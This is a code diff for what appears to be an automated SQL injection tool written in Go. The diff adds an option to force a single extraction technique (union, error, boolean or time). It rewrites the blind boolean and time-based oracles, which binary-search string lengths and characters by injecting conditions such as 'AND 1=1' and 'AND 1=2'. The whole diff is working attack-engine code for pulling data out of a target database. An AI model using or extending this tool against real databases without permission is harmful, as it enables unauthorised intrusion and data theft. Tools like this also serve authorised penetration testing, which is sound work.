@@ -85,24 +85,40 @@ func scalarExpr(expr string) string {
 
 // Scalar extracts a single value from the target database.
 func (x *Executor) Scalar(expr string) (string, error) {
-	techniques := []string{}
-	// In-band UNION extraction is the fastest and least noisy technique.
-	if x.S.Columns > 0 && x.S.StringCol >= 0 {
-		techniques = append(techniques, "union")
+	forced := strings.ToLower(strings.TrimSpace(x.E.Opts.ExtractTechnique))
+	if forced == "" || forced == "auto" {
+		forced = strings.ToLower(strings.TrimSpace(x.E.Opts.Technique))
 	}
-	if x.S.Technique != "" && x.S.Technique != "auto" {
-		techniques = append(techniques, x.S.Technique)
+	if forced == "blind" {
+		forced = "boolean"
 	}
-	for _, t := range []string{"union", "error", "boolean", "time"} {
-		found := false
-		for _, existing := range techniques {
-			if existing == t {
-				found = true
-				break
-			}
+
+	var techniques []string
+	switch forced {
+	case "union", "error", "boolean", "time":
+		// The caller explicitly selected a technique. Do not silently use a
+		// different one, because that changes the traffic profile and can
+		// bypass the operator's intent.
+		techniques = []string{forced}
+	default:
+		// In-band UNION extraction is the fastest and least noisy technique.
+		if x.S.Columns > 0 && x.S.StringCol >= 0 {
+			techniques = append(techniques, "union")
 		}
-		if !found {
-			techniques = append(techniques, t)
+		if x.S.Technique != "" && x.S.Technique != "auto" {
+			techniques = append(techniques, x.S.Technique)
+		}
+		for _, t := range []string{"union", "error", "boolean", "time"} {
+			found := false
+			for _, existing := range techniques {
+				if existing == t {
+					found = true
+					break
+				}
+			}
+			if !found {
+				techniques = append(techniques, t)
+			}
 		}
 	}
 
@@ -214,6 +230,7 @@ func (x *Executor) booleanScalar(expr string) (string, error) {
 	if err != nil {
 		return "", err
 	}
+
 	if length <= 0 {
 		return "", nil
 	}
@@ -260,7 +277,7 @@ func (x *Executor) timeScalar(expr string) (string, error) {
 }
 
 func (x *Executor) blindLength(expr string) (int, error) {
-	cond := fmt.Sprintf("%s > %%d", x.Dialect.Length(scalarExpr(expr)))
+	cond := fmt.Sprintf("%s >= %%d", x.Dialect.Length(scalarExpr(expr)))
 	return x.binarySearch(0, 512, func(mid int) bool {
 		return x.booleanOracle(fmt.Sprintf(cond, mid))
 	})
@@ -270,12 +287,12 @@ func (x *Executor) blindChar(expr string, pos int) (int, error) {
 	sub := x.Dialect.Substr(scalarExpr(expr), pos, 1)
 	ascii := x.Dialect.ASCII(sub)
 	return x.binarySearch(31, 127, func(mid int) bool {
-		return x.booleanOracle(fmt.Sprintf("%s > %d", ascii, mid))
+		return x.booleanOracle(fmt.Sprintf("%s >= %d", ascii, mid))
 	})
 }
 
 func (x *Executor) timeLength(expr string) (int, error) {
-	cond := fmt.Sprintf("%s > %%d", x.Dialect.Length(scalarExpr(expr)))
+	cond := fmt.Sprintf("%s >= %%d", x.Dialect.Length(scalarExpr(expr)))
 	return x.binarySearch(0, 256, func(mid int) bool {
 		return x.timeOracle(fmt.Sprintf(cond, mid))
 	})
@@ -285,7 +302,7 @@ func (x *Executor) timeChar(expr string, pos int) (int, error) {
 	sub := x.Dialect.Substr(scalarExpr(expr), pos, 1)
 	ascii := x.Dialect.ASCII(sub)
 	return x.binarySearch(31, 127, func(mid int) bool {
-		return x.timeOracle(fmt.Sprintf("%s > %d", ascii, mid))
+		return x.timeOracle(fmt.Sprintf("%s >= %d", ascii, mid))
 	})
 }
 
@@ -306,17 +323,23 @@ func (x *Executor) binarySearch(low, high int, predicate func(int) bool) (int, e
 	return result, nil
 }
 
-// booleanOracle compares a true condition with a false condition.
+// booleanOracle evaluates a condition by comparing its response with known
+// true and false reference responses. Comparing the condition against its own
+// negation is not sufficient: both requests differ from each other whether the
+// condition is true or false.
 func (x *Executor) booleanOracle(cond string) bool {
-	trueBody := x.booleanRequest(" AND (" + cond + ")")
-	if trueBody == "" {
+	if x.trueBody == "" || x.falseBody == "" {
+		x.trueBody = x.booleanRequest(" AND 1=1")
+		x.falseBody = x.booleanRequest(" AND 1=2")
+	}
+	if x.trueBody == "" || x.falseBody == "" || !responsesDiffer(x.trueBody, x.falseBody) {
 		return false
 	}
-	falseBody := x.booleanRequest(" AND NOT (" + cond + ")")
-	if falseBody == "" {
+	body := x.booleanRequest(" AND (" + cond + ")")
+	if body == "" {
 		return false
 	}
-	return responsesDiffer(trueBody, falseBody)
+	return responsesSimilar(body, x.trueBody) && responsesDiffer(body, x.falseBody)
 }
 
 func (x *Executor) booleanRequest(fragment string) string {
